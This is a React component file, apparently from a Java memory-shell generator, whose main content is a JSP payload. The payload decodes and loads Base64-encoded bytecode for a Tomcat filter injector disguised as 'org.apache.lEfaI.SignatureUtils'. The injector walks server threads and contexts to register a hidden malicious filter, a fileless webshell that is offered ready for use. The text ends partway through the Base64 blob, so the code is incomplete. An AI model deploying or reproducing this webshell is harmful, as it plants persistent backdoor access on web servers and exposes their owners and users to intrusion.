import { CodeViewer } from "@/components/code-viewer.tsx";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card.tsx";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs.tsx";
import { TicketsIcon } from "lucide-react";

export function ShellResult() {
  return (
    <Card className="h-full">
      <CardHeader className="pb-2">
        <CardTitle className="text-md flex items-center gap-2">
          <TicketsIcon className="h-5" />
          FBI
        </CardTitle>
      </CardHeader>
      <CardContent>
        <Tabs defaultValue="shell">
          <TabsList className="grid w-full grid-cols-3">
            <TabsTrigger value="packResult">打包结果</TabsTrigger>
            <TabsTrigger value="shell">内存马类</TabsTrigger>
            <TabsTrigger value="injector">注入器类</TabsTrigger>
          </TabsList>
          <TabsContent value="packResult" className="mt-4">
            <CodeViewer code={packerResult} language="java" />
          </TabsContent>
          <TabsContent value="shell" className="mt-4">
            <CodeViewer code={shellClass} language="java" />
          </TabsContent>
          <TabsContent value="injector" className="mt-4">
            <CodeViewer code={injectorClass} language="java" />
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
}

const packerResult = `<%!
    public byte[] decodeBase64(String bytecodeBase64) {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        try {
            Class<?> base64Clz = classLoader.loadClass("java.util.Base64");
            Class<?> decoderClz = classLoader.loadClass("java.util.Base64$Decoder");
            Object decoder = base64Clz.getMethod("getDecoder").invoke(base64Clz);
            return (byte[]) decoderClz.getMethod("decode", String.class).invoke(decoder, bytecodeBase64);
        } catch (Exception ee) {
            try {
                Class<?> datatypeConverterClz = classLoader.loadClass("javax.xml.bind.DatatypeConverter");
                return (byte[]) datatypeConverterClz.getMethod("parseBase64Binary", String.class).invoke(datatypeConverterClz, bytecodeBase64);
            } catch (Exception e) {
                return null;
            }
        }
    }
%>

<%
    String className = "org.apache.lEfaI.SignatureUtils";
    String base64Str = "yv66vgAAADIBvQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAQWNvbS9yZWFqYXNvbi9qYXZhd2ViL21lbXNlbGwvdG9tY2F0L2luamVjdG9yL1RvbWNhdEZpbHRlckluamVjdG9yAQAKZ2V0Q29udGV4dAEAEigpTGphdmEvdXRpbC9MaXN0OwsADgAPBwAQDAARABIBAA5qYXZhL3V0aWwvTGlzdAEACGl0ZXJhdG9yAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwsAFAAVBwAWDAAXABgBABJqYXZhL3V0aWwvSXRlcmF0b3IBAAdoYXNOZXh0AQADKClaCwAUABoMABsAHAEABG5leHQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwoACAAeDAAfACABAAlnZXRGaWx0ZXIBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwoACAAiDAAjACQBAAlhZGRGaWx0ZXIBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYHACYBABNqYXZhL2xhbmcvRXhjZXB0aW9uCAAoAQAOe3t1cmxQYXR0ZXJufX0IACoBAA17e2NsYXNzTmFtZX19CAAsAQANe3tiYXNlNjRTdHJ9fQgALgEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIKADAAMQcAMgwAMwA0AQAPamF2YS9sYW5nL0NsYXNzAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsIADYBAAxkZWNvZGVCdWZmZXIHADgBABBqYXZhL2xhbmcvU3RyaW5nCgAwADoMADsAPAEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsKADAAPgwAPwAcAQALbmV3SW5zdGFuY2UKAEEAQgcAQwwARABFAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7BwBHAQACW0IIAEkBABBqYXZhLnV0aWwuQmFzZTY0CABLAQAKZ2V0RGVjb2RlcgoAAgBNDABOAE8BAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsIAFEBAAZkZWNvZGUHAFMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQoAUgADBwBWAQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQoAVQBYDAAFAFkBAAUoW0IpVgcAWwEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtCgBaAF0MAAUAXgEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgoAWgBgDABhAGIBAARyZWFkAQAFKFtCKUkKAFIAZAwAZQBmAQAFd3JpdGUBAAcoW0JJSSlWCgBSAGgMAGkAagEAC3RvQnl0ZUFycmF5AQAEKClbQgoAMABsDABtAG4BABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7BwBwAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uCgAwAHIMAHMATwEADWdldFN1cGVyY2xhc3MKAG8AdQwABQB2AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWCgB4AHkHAHoMAHsAfAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYKAHgAfgwAfwAgAQADZ2V0CgAIAIEMAIIAgwEADGludm9rZU1ldGhvZAEAXShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwoAMACFDACGAIcBABJnZXREZWNsYXJlZE1ldGhvZHMBAB0oKVtMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwoAQQCJDACKAIsBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsKADcAjQwAjgCPAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaCgBBAJEMAJIAkwEAEWdldFBhcmFtZXRlclR5cGVzAQAUKClbTGphdmEvbGFuZy9DbGFzczsKADAAlQwAlgA8AQARZ2V0RGVjbGFyZWRNZXRob2QHAJgBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uCgCXAHUKAEEAeQcAnAEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwCeAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24KAJsAoAwAoQCLAQAKZ2V0TWVzc2FnZQoAnQB1BwCkAQATamF2YS91dGlsL0FycmF5TGlzdAoAowADBwCnAQAQamF2YS9sYW5nL1RocmVhZAgAqQEACmdldFRocmVhZHMKAAgAqwwAggCsAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsHAK4BABNbTGphdmEvbGFuZy9UaHJlYWQ7CgCmAIkIALEBABxDb250YWluZXJCYWNrZ3JvdW5kUHJvY2Vzc29yCgA3ALMMALQAtQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaCAC3AQAGdGFyZ2V0CgAIALkMALoArAEADWdldEZpZWxkVmFsdWUIALwBAAZ0aGlzJDAIAL4BAAhjaGlsZHJlbgcAwAEAEWphdmEvdXRpbC9IYXNoTWFwCgC/AMIMAMMAxAEABmtleVNldAEAESgpTGphdmEvdXRpbC9TZXQ7CwDGAA8HAMcBAA1qYXZhL3V0aWwvU2V0CgC/AH4KADAAiQgAywEAD1N0YW5kYXJkQ29udGV4dAsADgDNDADOAI8BAANhZGQIANABABVUb21jYXRFbWJlZGRlZENvbnRleHQKAKYA0gwA0wDUAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwoAMADWDADXAIsBAAh0b1N0cmluZwgA2QEAGVBhcmFsbGVsV2ViYXBwQ2xhc3NMb2FkZXIIANsBAB9Ub21jYXRFbWJlZGRlZFdlYmFwcENsYXNzTG9hZGVyCADdAQAJcmVzb3VyY2VzCADfAQAHY29udGV4dAoAnQDhDAAFAOIBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYKAKYA5AwA5QDmAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7CgAwAOgMAOkA1AEADmdldENsYXNzTG9hZGVyCgAIAOsMAOwAiwEADGdldENsYXNzTmFtZQoA7gDvBwDwDADxADQBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAlsb2FkQ2xhc3MKAAgA8wwA9ACLAQAPZ2V0QmFzZTY0U3RyaW5nCgAIAPYMAPcA+AEADGRlY29kZUJhc2U2NAEAFihMamF2YS9sYW5nL1N0cmluZzspW0IKAAgA+gwA+wD8AQAOZ3ppcERlY29tcHJlc3MBAAYoW0IpW0IIAP4BAAtkZWZpbmVDbGFzcwkBAAEBBwECDAEDAQQBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwoBAAEGDAEHAQgBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwcBCgEAE2phdmEvbGFuZy9UaHJvd2FibGUKAQkBDAwBDQAGAQAPcHJpbnRTdGFja1RyYWNlCgAIAQ8MARAA1AEAEWdldENhdGFsaW5hTG9hZGVyCAESAQANZmluZEZpbHRlckRlZggBFAEAL29yZy5hcGFjaGUudG9tY2F0LnV0aWwuZGVzY3JpcHRvci53ZWIuRmlsdGVyRGVmCAEWAQAvb3JnLmFwYWNoZS50b21jYXQudXRpbC5kZXNjcmlwdG9yLndlYi5GaWx0ZXJNYXAIARgBACRvcmcuYXBhY2hlLmNhdGFsaW5hLmRlcGxveS5GaWx0ZXJEZWYIARoBACRvcmcuYXBhY2hlLmNhdGFsaW5hLmRlcGxveS5GaWx0ZXJNYXAKADABHAwAMwEdAQA9KExqYXZhL2xhbmcvU3RyaW5nO1pMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylMamF2YS9sYW5nL0NsYXNzOwgBHwEADXNldEZpbHRlck5hbWUIASEBAA5zZXRGaWx0ZXJDbGFzcwgBIwEADGFkZEZpbHRlckRlZggBJQEADXNldERpc3BhdGNoZXIIAScBAAdSRVFVRVNUCAEpAQANYWRkVVJMUGF0dGVybgoACAErDAEsAIsBAA1nZXRVcmxQYXR0ZXJuCAEuAQAwb3JnLmFwYWNoZS5jYXRhbGluYS5jb3JlLkFwcGxpY2F0aW9uRmlsdGVyQ29uZmlnCgAwATAMATEBMgEAF2dldERlY2xhcmVkQ29uc3RydWN0b3JzAQAiKClbTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwgBNAEADXNldFVSTFBhdHRlcm4IATYBABJhZGRGaWx0ZXJNYXBCZWZvcmUIATgBAAxhZGRGaWx0ZXJNYXAKAToAeQcBOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yCgE6AT0MAD8BPgEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwgBQAEADWZpbHRlckNvbmZpZ3MHAUIBAA1qYXZhL3V0aWwvTWFwCwFBAUQMAUUBRgEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7CgAlAQwKAAgAAwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAZmaWx0ZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAhjb250ZXh0cwEAEExqYXZhL3V0aWwvTGlzdDsBAAR0aGlzAQBDTGNvbS9yZWFqYXNvbi9qYXZhd2ViL21lbXNlbGwvdG9tY2F0L2luamVjdG9yL1RvbWNhdEZpbHRlckluamVjdG9yOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBACRMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBAA1TdGFja01hcFRhYmxlAQAMZGVjb2RlckNsYXNzAQAHZGVjb2RlcgEAB2lnbm9yZWQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAliYXNlNjRTdHIBABJMamF2YS9sYW5nL1N0cmluZzsBABRMamF2YS9sYW5nL0NsYXNzPCo+OwEACkV4Y2VwdGlvbnMBAA5jb21wcmVzc2VkRGF0YQEAA291dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAJpbgEAHkxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtOwEAD2d6aXBJbnB1dFN0cmVhbQEAH0xqYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbTsBAAZidWZmZXIBAAFuAQABSQcBaAEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAR2YXI1AQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBAANvYmoBAARuYW1lAQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAFY2xhenoBAAx0YXJnZXRPYmplY3QBAAptZXRob2ROYW1lBwFzAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgEABXZhbHVlAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAdtZXRob2RzAQAbW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABZQEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBAApwYXJhbUNsYXp6AQASW0xqYXZhL2xhbmcvQ2xhc3M7AQAFcGFyYW0BABNbTGphdmEvbGFuZy9PYmplY3Q7AQAGbWV0aG9kAQAJdGVtcENsYXNzAQAVW0xqYXZhL2xhbmcvQ2xhc3M8Kj47BwF8BwF+BwF3AQAJU2lnbmF0dXJlAQBgKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzPCo+O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAEa2V5MQEAE0xqYXZhL3V0aWwvSGFzaE1hcDsBAANrZXkBAAtjaGlsZHJlbk1hcAEABnRocmVhZAEAEkxqYXZhL2xhbmcvVGhyZWFkOwEAB3RocmVhZHMBABdMamF2YS91dGlsL0hhc2hNYXA8Kio+OwEAJigpTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAJY2xhenpCeXRlAQACZTEBABVMamF2YS9sYW5nL1Rocm93YWJsZTsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAJZmlsdGVyRGVmAQAJZmlsdGVyTWFwAQACZTIBAAxjb25zdHJ1Y3RvcnMBACBbTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEADGZpbHRlckNvbmZpZwEAD0xqYXZhL3V0aWwvTWFwOwEADmNhdGFsaW5hTG9hZGVyAQAPZmlsdGVyQ2xhc3NOYW1lAQAjW0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjwqPjsHAZkHAaEBACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgcBowEAIGphdmEvbGFuZy9JbnN0YW50aWF0aW9uRXhjZXB0aW9uAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAZVG9tY2F0RmlsdGVySW5qZWN0b3IuamF2YQEAH29yZy9hcGFjaGUvbEVmYUkvU2lnbmF0dXJlVXRpbHMHAacKAagACQoBqAAeCgGoACIBACFMb3JnL2FwYWNoZS9sRWZhSS9TaWduYXR1cmVVdGlsczsBAAIvKggBrQEAHW9yZy5hcGFjaGUuTnBBVXAuRXJyb3JIYW5kbGVyCAGvAQ98SDRzSUFBQUFBQUFBLzZWWWVWaGMxUlgvWFdiZ0RjUEw0cENOTEdZMVlaOUFnQkJJWW9DUWdBS0pJVVlqK3VsamVNQ0VZV2J5NWcwQlNWcHI3V3B0N1Y2NzIxclQ5dE0ycVdZSXBtcTZxYlZiYkcxcnRhdjlvNnV0M1d0cnBiLzczcHZKREF6SjUrY2ZjKzk5OTV4NzdqbS9zOXg3NThsWEhub0VRTFdvOHlJSExnVnVGYm5JRTFoNFNCdlIvQ0V0UE9CdkNXbXhXRWRFNjlNTmdieXR3WERRM0M3Z0tpNDU0SUZIUUJrZkg5TEhqaDNMaHhjRkNsUVZjekJYb0RFUUdmWWJ1blpJaTBYQ2ZpbnRpTjdySDlhSFkzb281RGNqd3dITjlBOUUrbTRPaGtLYWY3Y3oyQlVNbVhJYkYwVUsrRHJPYTlGdEdzSHdRS01IOHdVODQrTlI2bVR2NlZOUktEZDB5eWtQRmxvYURmZlYydFRGS3BaSXFvc3pIaXdWbURzK1BxaExXN3EwWWQzbVdhNWloZVR4bmlkNHNGSmdYcEwxZ0JhS083eXJWYXlSdkFWcEZBbmRPb25iWlFKTGl6dXlJdGRZY2tDeWJWQlJqQkl1NzlQN2cySGRZaEJZWE56VDNONWVNbjBsalMyajVrMnQzVjVVb0ZLQlg4VkdWQWtVU3NaUmY4QVlpNW9SZjBzd09pZ3hLeGpRemZad3pOVENBVjJncEhnbWVQWU8weFkyS3Rna3NES0RFb3ZxQVgrM0hqQjA4MHA5ckp0Zlh0U2lUc0ZtRmZYWUlqQi91bXc2aGRzM2o1azY3WEVYbC9RMGUxR05Sb25LVnR2QUxPb2NrSFp0VjNFNWRuQ1JEQ3pKMm01enh2UkEzQWlhWTM1cTRMQTJxMmpCVGpxNEw3SXJHTlpDREVjSzVsNEtkam1vMkJ1MGpnYjBxQm1NaEJXMENWeG0yeGJUalpHUWJ2b0hUVFBxYjJQVGJVL3Mwdy9IOVppcDRBcUI5UmRqalVVajRaaGVnTjNvVU5HSkxvRjgydDJtMjlteGZsYlFNNllrbUh0VlhJVjloQzBRQ1p0YU1FellsbVhFenFCbWRFdk42TTNHa3V2a2p2dFZYSTBEakZQdTJLM0hZclJQWUUxeDBxdFpsTFo0R3VYYWExVWNsTnFxWEx0WE14aml6RE12QTdwSHhmVzRnWVJlTGFiWDFlelVBNUUraHMraWJKWklwM3B4bzRxYm9BbUlVWHFDK0YvSGVROEMvSWhxWXlGR2V3RjA5Q3NZVURHSW9NQ2xGMWJQMXFuSjVCNjljVk8vT0loN2VnL3BBWk1nRGlHa1lGaEZHSkdNaUxRWjdJaDBNcXl3ZUdaMmVYRVlob0tZQ2hOeFp2czBPa3RGY24yeStCWE5sT0prdDhSbG5XeEdWWXpoWm9KekZXdW9ETTRaMjBwMGpxbzRodGZSOGxpRzVSdXlXRDdUY0ZsM2IyRVVSSk51akVrSEgxWHdSb0VWRm5jdzRwZVoyR1FZMnRpZXVCbU5teFNtYThOZTNBcVhOUHZOS3Q2Q3Q3SmtoUFVqNTB2R2d1SXNNQ3Q0dThDcTg5TTJ1eG5VWkhxbDVkazdNcmxDSVgxQUN6VUZBblJ5R3RjN1dTSFBjKzJMVTlDd25xSjdjUWZ1bENYajNRSkwwckhZUDJoRWptaTlJZDBxQkVONHI0cjM0ZjFNZnlhSUZvcEpxTFBneEtScHh3ZFZmQWgzMldsNkRldUo5T1BpcEtFRWFpOVJkZ2hXWG41RXhVZnhNZkxINHIweHA3UXRLczZzenFrMC9nUStxZUJ1RlovQ3A1UDFKMU9rUU80Uk9aaW1ZVm9CSE1KblZOeUw0d3hYTTVLc3BabWVTRzEzS3o2bjR2T3kvaGFZa1pTSFpkamRwK0orZkNHVnhhM2haQlpuUm1CYS9Ua2g3VHdwOWNwbVdnRWV3SU1LVHFsSVlJS0JuNW5DOWluTkNoVms5bnBrTWJaUDdSM0YwMHBSWm9WdG5JMXFGMVVyc0NlZFRLNk1tOEZRWmJObGpZellNeXEraklkWlkvb2oxZ0hOcW42Uk1wRThRaCsxQzZZTkNmUDlLN3hYOUdRdEJsOVQ4WFY4d3c2VlR0MGNqUFNsVE1yWVplYnE5SDBOdlQvRThQUGJFcGcvanpNMGVyTFZyMi9pU1FYZlV2RnRmSWZ4UHBzRVJua3dQQklab3NsYnNrUjVGc2xac3RpRDc3R2U2UllHKzUwd1UvQ1VRSTZzM1Q5Z3BNVGk0Y3JoWUN4UTJkelUzWnFNSU1PREg4b3NzejQ4K0xFTnBYMUdrUFlUMHZwMG0vYmNUQmtwdnA4eE1HMis1bmgvdjNUQ0x4amoyV0tLMTRBV0szTG5kZkI2MUJVZjd0V04vVEx4NVdVd0V0QkNCelFqS0wrZFNiYzVHR1Q2Yit0NERiZk5SbFpyVnV6RnM1UjJZaFRvWlZCMEJ3ZkNtaGszZEZtYnNoVDJyYVhicFNTZWd3dXpYck9vN0lobTFDVEoweTRxY2lrTkVjUDhYU2N3cDl2VUFrT2RXdFN4cytlMVpWYkhyUG5McE9PTy9abDNiU2RvU09EVzZURzN6NDdNNElpK0o2b2JtVWNBMmZNMHcrQjV3OXRrcXJ4bVBZZklxc1NTcC8rcWkxMWZDRnlmWnZMQ01UZVdZVFJ2RmhjR2hWRVV5d1FpcWRuc1NMRmdCK3k2dHV3Q29GRi9JNm5FaHRuMW42YU54MGlwTWQyZHMxMDBHeFdoQ0N5L2tKbUt5SGZPL1ZtdFVrU0JjN1c5dUJ1WjRxbHhUQkZ6Wjl6ZkhObm5EM1V4UCszc2E5K1RKbW5sZERNZERDUGgvdUNBRlhscWY5b01EYjBRdjd6MzAxNGp3cGVoWXBjaytTQzFUenlCUzJaVVpUdmo2cGpBdlV5dDNCSDVWbU9WeXF3alk5RmtMVm1RUGFNVnUzSnhLMjkzSkc0RWRDcEY3c0xNSWxJcDE5SVBFV1BBcjBXMXdLRHU3NG8yWFIzMXR4cEd4R2pUd24waDFqMnh5b1BDZkxFYVBoNXptd0oxK3NiZWVtMUxvS3EydXJwRzg0aDFra1JYcmFxcWF0bFoxMVMvdWJaK1MzMU5WZDJtdXBaTm01dGE2cXZybXFxYk50WTB0M2pFQnNtNm1EcGRUYXdxbWdiMHNPa1JwWEp5T1ZYbUs4eXNxdDdrRVJWeVpyVU0rd3NxMXVnbFc0OXNicFROT3RtTXl1WStMbDdOZDZ2QXoza3RFL0pwRDdBdmRQb2xUci9DNmRkWWZUNUh1Y2hqKzB0KzFWanJnZUxTQ1lqU1FySG1sRmpMN3JKVFlqMjc0bE9paEYzWktWSE9ydktVOEo4RUxGbDhUenNTYWlraGgzMUphZGtFMXI0S0VieUtjNkVVc1ExdVMwUithWm1yN0pFSnJEL0JqeHo4aW0yZXBkMUtQTTkya2MyRVg0dU5sb2g4L0FaUGtmNWJpL3QzSFBIcDQyajFERmU2MlpmN1NrK2p2S3RpK1YxUTNNZmh6ajJENm9PbEQ0cjFDZFQ0YUhOREF0c3F5aEpvT3RFbFR0aElvQVN0Y09FdkhHK0Zhd3J6NEZiRWFnWG5oTUpucm15bVNFcWZ5MkVqcG9pM3k1bVVYSzJXL291SUZJaFZIdFpqTFRaUWRqRksyVDV2WVMvOXNCYS94eCs0WHlsdCtDTmU0SWhhcDJ3c3g1OHNHK1hvejNqUjhsWUNmN1dCeTdtZkVncUk1WXF5czlqZDRDNC9pL2FHM0NJMzdTdWZ4SlU1ZUF3dnBuMXg0RTlnejExNHJzZzlpVzZCaGp5THVuWVMxK1RndEtocVVFcUxGRmRDVkRjb1JYbSsza24wNWVCeHJKSGpNMkwxd2RJRURpVVFuUkNiaXBTRXFKbkV1QXZIY1h1UjIvZjZJbVVTYjNEaERHNDlPSUhiR2p5cDVXZHhPSUUzTmVRZng3d0c3eG5jY2JESU80RjNQVnFVWCtSSjREM1hzSGRiZmU0a1BpQ2toaVd1K2ZNVCtIQUNIeS9LVCtDZUZFWHlmOVpOM1U2TFdrazh2MER5ZjVGVHgxRlFVVVpMdnlTMW10T1FsL3c0U1VqdnhOMjRCMjl6K3R1aGlubkNsM0p6Q0o0cEhJVkhlay9rS2NLajRBRUZ1eFcwSzlEcFQyQ0tyc3VmamF6dzdzK1R3UHV5L0l0dGFBcmR5SnZKU204cHpZeUtmQ3NzRG1FcDI0MTBmeFZVYklLZndWRFBWR3BESGE3Q1p0ekFyNk5vNEVPd2tUcHZwOVpOMVB0eXZrVjI0QVNhY1JvdGhIWW5ucVlOejJJWHJkZ3QzTGlDWVhlbG1JYzl0SzFUTEVDWFdJNjlWcWpkeHVKd042MzlHLzdPdExtWGo1Si80SjlzNytUeitsLzROenlVdXQraDF2UE8reEwrUTkzYWVLMy9MOE5Qb1N3UFY3ekFPUVpiTWpnNWVobi9rOEhKMFN2RUtFZU9HUHlDTytXSnhTSkh1SmlFcXJoRXVFVXVjb1ZxSlhTT21FTWRCUzRYbHpqNVgyc2xNQmVmbkpiMys5UHlYcVJ5UWdpZktHUXJ4Ym5aeitGdlFhcWlsVm04V1lSZGF3bFRiYUlqTEYrK3pHd3RoRTQrbWF5am9zTjMralFlNml6M1BTTE80bXdDWHkxbi8xZ0NUM1JWTUFWODMzVS9qTU1IWGI1ejNTUlY4R1Bvb0t1VTR5Zk9vcmJqT0xaMCtiNXZMWmVCNzVieGZjajNkUHFTSXZlTU5ia043cklUVmlIZFJnKzMwdHVINlpsV21pZmpzMFNXb1IyeXpERFdhcTNpTXNXZ2NUdmZzdGJJdVpkb2xqUzNHaEtaNnluc1JycnRKaXhqVmR5R0lDWDBVbkFmZGtOSEovcTV4U0EzR2NBSXcxRkMwMFpKeTdCR0xHUVl1TGl5WGl3U2l5bWxFK3VzT1RkWFZqaHpUYWdWUzV4cU5TcUtHQ1FTN0JHeGxHZU1FTXNjcjlreWxuTmtyK1FvNlRYcW5DLy8zTEs5bGczOEgyVUYveGtIeWRxWjRKK3p3WDkyT3ZnL1RWOHlEZnh6cndMOFdsa0swc0MzdnJPREg2RXdnK2JIQ0toSnNVY3BJVTdCUndqRUtBRWQ0eGJqcE54TThJOWxnTDhpQy9nckxnTCszQlQ0VDEwWWZGSXZsYnhpNWY4QkpDclRpRndZQUFBPQgBsQoBqACBCgGoAKsKAagAuQoBqADrCgGoAPMKAagA9goBqAD6CgGoAQ8KAagBKwoBqAADACEBqAACAAAAAAAOAAEABQAGAAEBSQAAANgAAwAFAAAANiq3AAEqtgGpTCu5AA0BAE0suQATAQCZABssuQAZAQBOKi22Aao6BCotGQS2Aaun/+KnAARMsQABAAQAMQA0ACUABAFUAAAAGgAE/wAQAAMHAagHAA4HABQAAPkAIEIHACUAAUoAAAAmAAkAAAAcAAQAHgAJAB8AIAAgACcAIQAuACIAMQAkADQAIwA1ACUBSwAAACoABAAnAAcBTAFNAAQAIAAOAN8BTQADAAkAKAFOAU8AAQAAADYBUAGsAAABUgAAAAwAAQAJACgBTgFTAAEAAQEsAIsAAQFJAAAAEAABAAEAAAAEEwGusAAAAAAAAQDsAIsAAQFJAAAAEAABAAEAAAAEEwGwsAAAAAAAAQD0AIsAAQFJAAAAEAABAAEAAAAEEwGysAAAAAAACAD3APgAAgFJAAAA+gAGAAQAAABkEi24AC9MKxI1BL0AMFkDEjdTtgA5K7YAPQS9AAJZAypTtgBAwABGsE0SSLgAL0wrEkoDvQAwtgA5AQO9AAK2AEBOLbYATBJQBL0AMFkDEjdTtgA5LQS9AAJZAypTtgBAwABGsAABAAAAJwAoACUABAFUAAAABgABaAcAJQFKAAAAGgAGAAAANgAGADcAKAA4ACkAOQAvADoAQgA7AUsAAAA0AAUABgAiAVUBBAABAEIAIgFWAU0AAwApADsBVwFYAAIAAABkAVkBWgAAAC8ANQFVAQQAAQFSAAAAFgACAAYAIgFVAVsAAQAvADUBVQFbAAEBXAAAAAQAAQAlAAkA+wD8AAIBSQAAANQABAAGAAAAPrsAUlm3AFRMuwBVWSq3AFdNuwBaWSy3AFxOEQEAvAg6BC0ZBLYAX1k2BZsADysZBAMVBbYAY6f/6yu2AGewAAAAAwFUAAAAHAAC/wAhAAUHAEYHAFIHAFUHAFoHAEYAAPwAFwEBSgAAAB4ABwAAAEAACABBABEAQgAaAEMAIQBFAC0ARgA5AEgBSwAAAD4ABgAAAD4BXQBHAAAACAA2AV4BXwABABEALQFgAWEAAgAaACQBYgFjAAMAIQAdAWQARwAEACoAFAFlAWYABQFcAAAABAABAWcAAQC6AKwAAgFJAAAA9gADAAYAAAA9AU4rtgBMOgQZBBICpQAZGQQstgBrTqcADzoFGQS2AHE6BKf/5i3HAAy7AG9ZLLcAdL8tBLYAdy0rtgB9sAABAA8AFgAZAG8ABAFUAAAAEQAE/QAIBwB4BwAwUAcAbwsMAUoAAAAyAAwAAABNAAIATgAIAE8ADwBRABYAUgAZAFMAGwBUACIAVQAlAFcAKQBYADIAWgA3AFsBSwAAAD4ABgAbAAcBaQFqAAUAAAA9AVABrAAAAAAAPQFrAU0AAQAAAD0BbAFaAAIAAgA7AW0BbgADAAgANQFvAQQABAFSAAAADAABAAgANQFvAVsABAFcAAAABAABACUAKQCCAKwAAgFJAAAAQgAEAAIAAAAOKisDvQAwA70AArgBs7AAAAACAUoAAAAGAAEAAABgAUsAAAAWAAIAAAAOAXABTQAAAAAADgFxAVoAAQFcAAAACAADAJcAmwFyACkAggCDAAMBSQAA